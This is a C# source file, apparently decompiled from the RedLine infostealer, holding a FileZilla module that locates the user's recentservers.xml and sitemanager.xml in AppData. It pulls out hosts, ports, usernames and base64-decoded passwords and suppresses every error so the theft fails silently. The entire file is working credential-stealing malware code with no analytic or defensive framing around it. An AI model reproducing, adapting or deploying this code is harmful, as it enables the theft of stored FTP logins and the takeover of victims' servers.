using RedLine.Logic.Helpers;
using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace RedLine.Logic.FtpClients
{
	public static class FileZilla
	{
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string path = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\recentservers.xml";
				string path2 = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\sitemanager.xml";
				if (File.Exists(path))
				{
					list.AddRange(ParseCredentials(path));
				}
				if (!File.Exists(path2))
				{
					return list;
				}
				list.AddRange(ParseCredentials(path2));
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<LoginPair> ParseCredentials(string Path)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					LoginPair loginPair = ParseRecent(childNode);
					if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static LoginPair ParseRecent(XmlNode xmlNode)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				foreach (XmlNode childNode in xmlNode.ChildNodes)
				{
					if (childNode.Name == "Host")
					{
						loginPair.Host = childNode.InnerText;
					}
					if (childNode.Name == "Port")
					{
						loginPair.Host = loginPair.Host + ":" + childNode.InnerText;
					}
					if (childNode.Name == "User")
					{
						loginPair.Login = childNode.InnerText;
					}
					if (childNode.Name == "Pass")
					{
						loginPair.Password = DecryptHelper.Base64Decode(childNode.InnerText);
					}
				}
				return loginPair;
			}
			catch
			{
				return loginPair;
			}
			finally
			{
				loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
				loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
			}
		}
	}
}
